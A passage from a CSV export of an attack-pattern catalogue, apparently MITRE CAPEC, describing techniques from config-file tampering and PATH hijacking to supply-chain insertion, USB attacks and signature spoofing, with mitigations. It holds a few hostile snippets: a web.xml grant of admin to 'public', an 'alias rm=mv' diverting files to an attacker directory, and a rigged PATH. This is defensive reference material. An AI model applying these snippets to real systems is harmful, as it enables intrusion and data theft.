client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process.::The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name public grants all users with the public role the ability to use the administration functionality. < security-constraint><description>Security processing rules for admin screens</description><url-pattern>/admin/*</url-pattern><http-method>POST</http-method><http-method>GET</http-method><auth-constraint><role-name>administrator</role-name><role-name>public</role-name> </auth-constraint> </security-constraint> The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control.::\",\"::94::96::95::97::272::59::282::270::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.006:ENTRY NAME:Obfuscated Files or Information: HTML Smuggling::::TAXONOMY NAME:ATTACK:ENTRY ID:1027.009:ENTRY NAME:Obfuscated Files or Information: Embedded Payloads::::TAXONOMY NAME:ATTACK:ENTRY ID:1564.009:ENTRY NAME:Hide Artifacts: Resource Forking::\",\"\",\n37,\"Retrieve Embedded Sensitive Data\",Detailed,Draft,\"An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:167::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] Attacker identifies client components to extract information from. These may be binary executables, class files, shared libraries (e.g., DLLs), configuration files, or other system files.:TECHNIQUE:Binary file extraction. The attacker extracts binary files from zips, jars, wars, PDFs or other composite formats.:TECHNIQUE:Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.::STEP:2:PHASE:Exploit:DESCRIPTION:[Retrieve Embedded Data] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to retrieve the information of interest.:TECHNIQUE:API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.:TECHNIQUE:Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator, external system, or other debugging harness.:TECHNIQUE:Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.:TECHNIQUE:Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, they attempt decoding in that format.::\",\"::In order to feasibly execute this type of attack, some valuable data must be present in client software.::Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack.::\",\"::SKILL:The attacker must possess knowledge of client code structure as well as ability to reverse-engineer or decompile it or probe it in other ways. This knowledge is specific to the technology and language used for the client distribution:LEVEL:Medium::\",\"::The attacker must possess access to the system or code being exploited. Such access, for this set of attacks, will likely be physical. The attacker will make use of reverse engineering technologies, perhaps for data or to extract functionality from the binary. Such tool use may be as simple as Strings or a hex editor. Removing functionality may require the use of only a hex editor, or may require aspects of the toolchain used to construct the application: for instance the Adobe Flash development environment. Attacks of this nature do not require network access or undue CPU, memory, or other hardware-based resources.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"\",\"::Using a tool such as 'strings' or similar to pull out text data, perhaps part of a database table, that extends beyond what a particular user's purview should be.::An attacker can also use a decompiler to decompile a downloaded Java applet in order to look for information such as hardcoded IP addresses, file paths, passwords or other such contents.::Attacker uses a tool such as a browser plug-in to pull cookie or other token information that, from a previous user at the same machine (perhaps a kiosk), allows the attacker to log in as the previous user.::\",\"::226::311::525::312::314::315::318::1239::1258::1266::1272::1278::1301::1330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials: Private Keys::\",\"\",\n38,\"Leveraging/Manipulating Configuration File Search Paths\",Detailed,Draft,\"This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:159::\",\"\",\"::The attacker must be able to write to redirect search paths on the victim host.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Ensure that the program's compound parts, including all system dependencies, classpath, path, and so on, are secured to the same or higher level assurance as the program::Implementation: Host integrity monitoring::\",\"::Another method is to redirect commands by aliasing one legitimate command to another to create unexpected results. the Unix command rm could be aliased to mv and move all files the victim thinks they are deleting to a directory the attacker controls. In a Unix shell .profile setting alias rm=mv /usr/home/attacker In this case the attacker retains a copy of all the files the victim attempts to remove.::A standard UNIX path looks similar to this /bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin If the attacker modifies the path variable to point to a locale that includes malicious resources then the user unwittingly can execute commands on the attackers' behalf: /evildir/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin This is a form of usurping control of the program and the attack can be done on the classpath, database resources, or any other resources built from compound parts. At runtime detection and blocking of this attack is nearly impossible, because the configuration allows execution.::\",\"::426::427::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.007:ENTRY NAME:Hijack Execution Flow: Path Interception by PATH Environment Variable::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.009:ENTRY NAME:Hijack Execution Flow: Path Interception by Unquoted Path::\",\"\",\n383,\"Harvesting Information via API Event Monitoring\",Detailed,Draft,\"An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a virtual sale of rare items. As other users enter the event, the attacker records via AiTM (CAPEC-94) proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:407::NATURE:CanPrecede:CAPEC ID:94::\",\"\",\"::The target software is utilizing application framework APIs::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is able to gather information to potentially support further nefarious activities.::\",\"::Leverage encryption techniques during information transactions so as to protect them from attack patterns of this kind.::\",\"\",\"::311::319::419::602::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056.004:ENTRY NAME:Input Capture: Credential API Hooking::\",\"\",\n407,\"Pretexting\",Standard,Draft,\"An adversary engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the adversary's interests. During a pretexting attack, the adversary creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie; in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:416::NATURE:ChildOf:CAPEC ID:410::NATURE:CanPrecede:CAPEC ID:163::\",\"\",\"::The adversary must have the means and knowledge of how to communicate with the target in some manner.The adversary must have knowledge of the pretext that would influence the actions of the specific target.::\",\"::SKILL:The adversary requires strong inter-personal and communication skills.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Depending on the adversary's intentions and the specific nature their actions/requests, a successful pretexting attack can result in the compromise to the confidentiality of sensitive information in a variety of contexts.::\",\"::An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.::\",\"::The adversary dresses up like a jogger and runs in place by the entrance of a building, pretending to look for their access card. Because the hood obscures their face, it may be possible to solicit someone inside the building to let them inside.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1589:ENTRY NAME:Gather Victim Identity Information::\",\"\",\n438,\"Modification During Manufacture\",Meta,Draft,\"An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195:ENTRY NAME:Supply Chain Compromise::\",\"\",\n439,\"Manipulation During Distribution\",Meta,Draft,\"An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.\",\"\",,,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::A malicious OEM provider, or OEM provider employee or contractor, may install software, or modify existing code, during distribution.::External contractors involved in the packaging or testing of products or components may install software, or modify existing code, during distribution.::\",\"::1269::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195:ENTRY NAME:Supply Chain Compromise::\",\"\",\n440,\"Hardware Integrity Attack\",Meta,Stable,\"An adversary exploits a weakness in the system maintenance process and causes a change to be made to a technology, product, component, or sub-component or a new one installed during its deployed use at the victim location for the purpose of carrying out an attack.\",\"\",Low,High,\"\",\"\",\"::Influence over the deployed system at a victim location.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::::TAXONOMY NAME:ATTACK:ENTRY ID:1200:ENTRY NAME:Hardware Additions::\",\"\",\n442,\"Infected Software\",Standard,Stable,\"An adversary adds malicious logic, often in the form of a computer virus, to otherwise benign software. This logic is often hidden from the user of the software and works behind the scenes to achieve negative impacts. Many times, the malicious logic is inserted into empty space between legitimate code, and is then called when the software is executed. This pattern of attack focuses on software already fielded and used in operation as opposed to software that is still under development and part of the supply chain.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:441::\",\"\",\"::Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Leverage anti-virus products to detect and quarantine software with known virus.::\",\"\",\"::506::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n443,\"Malicious Logic Inserted Into Product by Authorized Developer\",Detailed,Stable,\"An adversary uses their privileged position within an authorized development organization to inject malicious logic into a codebase or product.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Access to the product during the initial or continuous development.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Assess software and hardware during development and prior to deployment to ensure that it functions as intended and without any malicious functionality. This includes both initial development, as well as updates propagated to the product after deployment.::\",\"::In January 2022 the author of popular JavaScript packages Faker and colors, used for generating mock data and including colored text within NodeJS consoles respectively, introduced malicious code that resulted in a Denial of Service (DoS) via an infinite loop. When applications that leveraged these packages updated to the malicious version, their applications executed the infinite loop and output gibberish ASCI characters endlessly. This resulted in the application being unusable until a stable version of the package was obtained. [REF-705]::During initial development, an authorized hardware developer implants a malicious microcontroller within an Internet of Things (IOT) device and programs the microcontroller to communicate with the vulnerable device. Each time the device initializes, the malicious microcontroller's code is executed, which ultimately provides the adversary with backdoor access to the vulnerable device. This can further allow the adversary to sniff network traffic, exfiltrate date, execute unauthorized commands, and/or pivot to other vulnerable devices.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n445,\"Malicious Logic Insertion into Product Software via Configuration Management Manipulation\",Detailed,Stable,\"An adversary exploits a configuration management system so that malicious logic is inserted into a software products build, update or deployed environment. If an adversary can control the elements included in a product's configuration management for build they can potentially replace, modify or insert code files containing malicious logic. If an adversary can control elements of a product's ongoing operational configuration management baseline they can potentially force clients receiving updates from the system to install insecure software when receiving updates from the server.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.::Leverage anti-virus products to detect and quarantine software with known virus.::\",\"::In 2016, the policy-based configuration management system Chef was shown to be vulnerable to remote code execution attacks based on its Chef Manage add-on improperly deserializing user-driven cookie data. This allowed unauthenticated users the ability to craft cookie data that executed arbitrary code with the web server's privileges. [REF-706]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\",\n446,\"Malicious Logic Insertion into Product via Inclusion of Third-Party Component\",Detailed,Stable,\"An adversary conducts supply chain attacks by the inclusion of insecure third-party components into a technology, product, or code-base, possibly packaging a malicious driver or component along with the product before shipping it to the consumer or acquirer.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Access to the product during the initial or continuous development. This access is often obtained via insider access to include the third-party component after deployment.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Assess software and hardware during development and prior to deployment to ensure that it functions as intended and without any malicious functionality. This includes both initial development, as well as updates propagated to the product after deployment.::Don't assume popular third-party components are free from malware or vulnerabilities. For software, assess for malicious functionality via update/commit reviews or automated static/dynamic analysis prior to including the component within the application and deploying in a production environment.::\",\"::From mid-2014 to early 2015, Lenovo computers were shipped with the Superfish Visual Search software that ultimately functioned as adware on the system. The Visual Search installation included a self-signed root HTTPS certificate that was able to intercept encrypted traffic for any site visited by the user. Of more concern was the fact that the certificate's corresponding private key was the same for every Lenovo machine. Once the private key was discovered [REF-709], an adversary could then conduct an Adversary-in-the-Middle (AitM) attack that would go undetected by machines that had this certificate installed on it. Adversaries could then masquerade as legitimate entities such as financial institutions, popular corporations, or other secure destinations on the Internet. [REF-708]::In 2018 it was discovered that Chinese spies infiltrated several U.S. government agencies and corporations as far back as 2015 by including a malicious microchip within the motherboard of servers sold by Elemental Technologies to the victims. Although these servers were assembled via a U.S. based company, the motherboards used within the servers were manufactured and maliciously altered via a Chinese subcontractor. Elemental Technologies then sold these malicious servers to various U.S. government agencies, such as the DoD and CIA, and corporations like Amazon and Apple. The malicious microchip provided adversaries with a backdoor into the system, which further allowed them to access any network that contained the exploited systems, to exfiltrate data to be sent to the Chinese government.[REF-713]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195:ENTRY NAME:Supply Chain Compromise::\",\"\",\n448,\"Embed Virus into DLL\",Detailed,Stable,\"An adversary tampers with a DLL and embeds a computer virus into gaps between legitimate machine instructions. These gaps may be the result of compiler optimizations that pad memory blocks for performance gains. The embedded virus then attempts to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:442::\",\"\",\"::Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.::\",\"\",\"\",\"\",\"::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Leverage anti-virus products to detect and quarantine software with known virus.::\",\"\",\"::506::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.009:ENTRY NAME:Obfuscated Files or Information: Embedded Payloads::\",\"\",\n457,\"USB Memory Attacks\",Detailed,Draft,\"An adversary loads malicious code onto a USB memory stick in order to infect any system which the device is plugged in to. USB drives present a significant security risk for business and government agencies. Given the ability to integrate wireless functionality into a USB stick, it is possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship. These attacks can be performed by an adversary with direct access to a target system or can be executed via means such as USB Drop Attacks.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:456::NATURE:CanPrecede:CAPEC ID:529::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Target System] In certain cases, the adversary will explore an organization's network to determine a specific target machine to exploit based on the information it contains or privileges the main user may possess.:TECHNIQUE:If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop or Obtain malware and install on a USB device] The adversary develops or obtains the malicious software necessary to exploit the target system, which they then install on an external USB device such as a USB flash drive.:TECHNIQUE:The adversary can develop or obtain malware for to perform a variety of tasks such as sniffing network traffic or monitoring keystrokes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Connect or deceive a user into connecting the infected USB device] Once the malware has been placed on an external USB device, the adversary connects the device to the target system or deceives a user into connecting the device to the target system such as in a USB Drop Attack.:TECHNIQUE:The adversary connects the USB device to a specified target system or performs a USB Drop Attack, hoping a user will find and connect the USB device on their own. Once the device is connected, the malware executes giving the adversary access to network traffic, credentials, etc.::\",\"::Some level of physical access to the device being attacked.::Information pertaining to the target organization on how to best execute a USB Drop Attack.::\",\"\",\"\",\"\",\"\",\"::Ensure that proper, physical system access is regulated to prevent an adversary from physically connecting a malicious USB device themself.::Use anti-virus and anti-malware tools which can prevent malware from executing if it finds its way onto a target system. Additionally, make sure these tools are regularly updated to contain up-to-date virus and malware signatures.::Do not connect untrusted USB devices to systems connected on an organizational network. Additionally, use an isolated testing machine to validate untrusted devices and confirm malware does not exist.::\",\"\",\"::1299::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1091:ENTRY NAME:Replication Through Removable Media::::TAXONOMY NAME:ATTACK:ENTRY ID:1092:ENTRY NAME:Communication Through Removable Media::\",\"\",\n464,\"Evercookie\",Standard,Draft,\"An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places. When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:554::\",\"\",\"::The victim's browser is not configured to reject all cookiesThe victim visits a website that serves the attackers' evercookie::\",\"\",\"::Evercookie source code::\",\"\",\"\",\"::Design: Browser's design needs to be changed to limit where cookies can be stored on the client side and provide an option to clear these cookies in all places, as well as another option to stop these cookies from being written in the first place.::Design: Safari browser's private browsing mode is currently effective against evercookies.::\",\"\",\"::359::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1606.001:ENTRY NAME:Forge Web Credentials: Web Cookies::\",\"\",\n465,\"Transparent Proxy Abuse\",Standard,Draft,\"A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:554::\",\"\",\"::Transparent proxy is usedVulnerable configuration of network topology involving the transparent proxy (e.g., no NAT happening between the client and the proxy)Execution of malicious Flash or Applet in the victim's browser::\",\"::SKILL:Creating malicious Flash or Applet to open a cross-domain socket connection to a remote system:LEVEL:Medium::\",\"\",\"\",\"\",\"::Design: Ensure that the transparent proxy uses an actual network layer IP address for routing requests. On the transparent proxy, disable the use of routing based on address information in the HTTP host header.::Configuration: Disable in the browser the execution of Java Script, Flash, SilverLight, etc.::\",\"\",\"::441::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1090.001:ENTRY NAME:Proxy: Internal Proxy::\",\"\",\n469,\"HTTP DoS\",Standard,Draft,\"An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:227::\",\"\",\"::HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding::\",\"\",\"::Ability to issues hundreds of HTTP requests::\",\"\",\"\",\"::Configuration: Configure web server software to limit the waiting period on opened HTTP sessions::Design: Use load balancing mechanisms::\",\"\",\"::770::772::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service: Service Exhaustion Flood::\",\"\",\n471,\"Search Order Hijacking\",Detailed,Stable,\"An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:159::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.:TECHNIQUE:The attacker uses a tool such as the OSX otool utility or manually probes whether the target application uses dynamically linked libraries.:TECHNIQUE:The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that they will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.:TECHNIQUE:The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries they crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.:TECHNIQUE:The attacker modifies the entries in the configuration files pointing to the malicious libraries they crafted.:TECHNIQUE:The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-132.:TECHNIQUE:The attacker leverages file search path order issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-38.::\",\"::Attacker has a mechanism to place its malicious libraries in the needed location on the file system.::\",\"::SKILL:Ability to create a malicious library.:LEVEL:Medium::\",\"\",\"\",\"\",\"::Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected::Design: Sign system DLLs so that unauthorized DLLs can be detected.::\",\"::For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.::macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.::\",\"::427::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.001:ENTRY NAME:Hijack Execution Flow:DLL search order hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.004:ENTRY NAME:Hijack Execution Flow: Dylib Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.008:ENTRY NAME:Hijack Execution Flow: Path Interception by Search Order Hijacking::\",\"\",\n473,\"Signature Spoof\",Standard,Draft,\"An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:151::\",\"\",\"::The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.::The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.::\",\"::SKILL:Technical understanding of how signature verification algorithms work with data and applications:LEVEL:High::\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"\",\"::An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.::An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor.::\",\"::20::327::290::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.001:ENTRY NAME:Masquerading: Invalid Code Signature::::TAXONOMY NAME:ATTACK:ENTRY ID:1553.002:ENTRY NAME:Subvert Trust Controls: Code Signing::\",\"\",\n474,\"Signature Spoofing by Key Theft\",Detailed,Draft,\"An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::An authoritative or reputable signer is storing their private signature key with insufficient protection.::\",\"::SKILL:Knowledge of common location methods and access methods to sensitive data:LEVEL:Low::SKILL:Ability to compromise systems containing sensitive data:LEVEL:High::\",\"\",\"\",\"\",\"::Restrict access to private keys from non-supervisory accounts::Restrict access to administrative personnel and processes only::Ensure all remote methods are secured::Ensure all services are patched and up to date::\",\"\",\"::522::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecured Credentials: Private Keys::\",\"\",\n478,\"Modification of Windows Service Configuration\",Detailed,Usable,\"An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. The goal of this attack is to execute a malicious binary in place of an existing service.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:203::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target system] The adversary must first determine the system they wish to modify the registry of. This needs to be a windows machine as this attack only works on the windows registry.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the windows registry.:TECHNIQUE:Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.:TECHNIQUE:Gain remote access to a system through a variety of means.::STEP:3:PHASE:Exploit:DESCRIPTION:[Modify windows registry] The adversary will modify the windows registry by changing the configuration settings for a service. Specifically, the adversary will change the path settings to define a path to a malicious binary to be executed.::\",\"::The adversary must have the capability to write to the Windows Registry on the targeted system.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:By altering specific configuration settings for the service, the adversary could run arbitrary code to be executed.::\",\"::Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.011:ENTRY NAME:Hijack Execution Flow:Service Registry Permissions Weakness::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.003:ENTRY NAME:Create or Modify System Process:Windows Service::\",\"\",\n479,\"Malicious Root Certificate\",Detailed,Stable,\"An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::The adversary must have the ability to create a new root certificate.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1553.004:ENTRY NAME:Subvert Trust Controls:Install Root Certificate::\",\"\",\n480,\"Escaping 